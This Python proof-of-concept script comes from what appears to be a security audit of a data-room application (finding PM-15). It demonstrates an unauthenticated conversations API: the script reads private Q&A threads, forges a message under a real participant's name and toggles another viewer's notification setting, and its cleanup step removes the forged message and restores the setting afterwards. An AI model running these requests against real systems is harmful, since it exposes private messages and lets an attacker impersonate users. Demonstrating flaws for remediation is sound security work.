#!/usr/bin/env python3
"""PM-15 — the viewer-facing conversations API has no authentication. Given a
`dataroomId` and a participant's `viewerId`, an unauthenticated caller reads a
PRIVATE Q&A thread, posts a message attributed to that participant, and toggles
another viewer's notification setting. No cookie, no session, no team check.

The forged message is deleted and the notification setting restored in `finally`.

    docker exec -e PYTHONPATH=/opt/poc-deps pm-audit-app \
        python3 /app/security-review/pm-15-unauthenticated-conversations-api/poc.py
"""
import sys
import pathlib
import time

sys.path.insert(0, str(pathlib.Path(__file__).resolve().parents[1] / "_poc"))
from pmpoc import (  # noqa: E402
    BASE, db, db_close, get, post, as_json, table_counts, count_delta,
    VULN, CONTROL, OBSERVE, log, summary,
)

# ---- discover a PRIVATE conversation and a genuine participant --------------
conv = db("""
  select c.id conv, c."dataroomId" room, c."teamId" team, cp."viewerId" viewer, v.email,
         count(m.id)::int msgs
  from "Conversation" c
  join "ConversationParticipant" cp on cp."conversationId"=c.id and cp."viewerId" is not null
  join "Viewer" v on v.id=cp."viewerId"
  left join "Message" m on m."conversationId"=c.id
  where c."visibilityMode"='PRIVATE'
    and v.email !~* '(attacker|evil|selfenrol|xtenant|probe)'
  group by c.id, c."dataroomId", c."teamId", cp."viewerId", v.email
  having count(m.id) > 0
  order by count(m.id) desc limit 1
""")[0]
CONV, ROOM, TEAM, VIEWER, EMAIL = (conv["conv"], conv["room"], conv["team"],
                                   conv["viewer"], conv["email"])
MARK = f"PM15-{int(time.time())}"

log(f"PM-15 — unauthenticated conversations API   base={BASE}")
log(f"  conversation={CONV}  room={ROOM}  team={TEAM}")
log(f"  participant viewerId={VIEWER} ({EMAIL})")
log("")

forged_id = None
orig_pref = None
try:
    # ---- ground truth (from the database, independent of the attack) --------
    CONTROL("the conversation is PRIVATE and belongs to the victim team",
            conv["msgs"] > 0 and bool(TEAM))
    is_participant = db('select 1 from "ConversationParticipant" '
                        'where "conversationId"=$1 and "viewerId"=$2', [CONV, VIEWER])
    CONTROL("the viewerId is a genuine participant row", bool(is_participant))
    preexisting = db('select count(*)::int n from "Message" where "conversationId"=$1 '
                     "and content not like 'PM15-%'", [CONV])[0]["n"]
    CONTROL("the thread already contains messages the attacker did not write",
            preexisting > 0, f"{preexisting} pre-existing message(s)")

    # ---- anonymous read ----------------------------------------------------
    before = table_counts()
    r_status, r_text, _ = get(f"/api/conversations?dataroomId={ROOM}&viewerId={VIEWER}")
    convos = as_json(r_text)
    lst = convos if isinstance(convos, list) else []
    priv = [c for c in lst if c.get("visibilityMode") == "PRIVATE"]
    bodies = [m.get("content", "") for c in priv for m in (c.get("messages") or [])]
    log(f"    anonymous GET -> HTTP {r_status}, {len(lst)} thread(s), {len(priv)} PRIVATE")
    for b in bodies[:4]:
        log(f"      > {str(b)[:80]}")
    VULN("an unauthenticated caller reads PRIVATE threads with message bodies",
         r_status == 200 and len(priv) > 0 and len(bodies) > 0,
         f"{len(bodies)} message bodies, no cookie")

    after = table_counts()
    delta = count_delta(before, after)
    VULN("the read leaves no trace anywhere in the schema",
         len(delta) == 0, "0 row changes" if not delta else str(delta))

    # ---- anonymous write: forge a message as the participant ----------------
    content = f"{MARK}: forged by an unauthenticated caller"
    w_status, _, _ = post("/api/conversations/messages",
                          {"conversationId": CONV, "viewerId": VIEWER, "content": content})
    rows = db('select m.id, m."viewerId", m."userId", v.email attrib '
              'from "Message" m left join "Viewer" v on v.id=m."viewerId" '
              "where m.content=$1", [content])
    forged = rows[0] if rows else None
    forged_id = forged["id"] if forged else None
    OBSERVE("message POST response",
            f"HTTP {w_status} (a 500 is TRIGGER_SECRET_KEY thrown AFTER the write)")
    VULN("an anonymous message is stored in the victim's private thread",
         bool(forged), forged_id or "no row")
    VULN("it is attributed to the genuine participant, not an anonymous author",
         bool(forged) and forged["viewerId"] == VIEWER and forged["userId"] is None,
         f"attributed to {forged['attrib'] if forged else '?'}")

    # ---- anonymous tamper: toggle the participant's notification setting -----
    def pref():
        r = db('select "receiveNotifications" rn from "ConversationParticipant" '
               'where "conversationId"=$1 and "viewerId"=$2', [CONV, VIEWER])
        return r[0]["rn"] if r else None
    orig_pref = pref()
    flip_to = not orig_pref
    t1, _, _ = post("/api/conversations/notifications",
                    {"conversationId": CONV, "viewerId": VIEWER, "enabled": flip_to})
    after_flip = pref()
    t2, _, _ = post("/api/conversations/notifications",
                    {"conversationId": CONV, "viewerId": VIEWER, "enabled": orig_pref})
    after_restore = pref()
    log(f"    {orig_pref} --(HTTP {t1})--> {after_flip} --(HTTP {t2})--> {after_restore}")
    VULN("an anonymous caller writes another viewer's notification setting",
         after_flip == flip_to and after_restore == orig_pref,
         f"flipped and restored (original={orig_pref})")

    OBSERVE("cross-tenant", "conversations-route.ts:19-28 reads viewerId from the query and "
            "never compares it to a session or team, so a caller in any tenant (or none) reads this thread")
finally:
    if forged_id:
        db('delete from "Message" where id=$1', [forged_id])
    if orig_pref is not None:
        db('update "ConversationParticipant" set "receiveNotifications"=$3 '
           'where "conversationId"=$1 and "viewerId"=$2', [CONV, VIEWER, orig_pref])
    log("")
    log("  cleanup: forged message deleted; notification setting restored")

summary("PM-15 unauthenticated conversations API")
db_close()
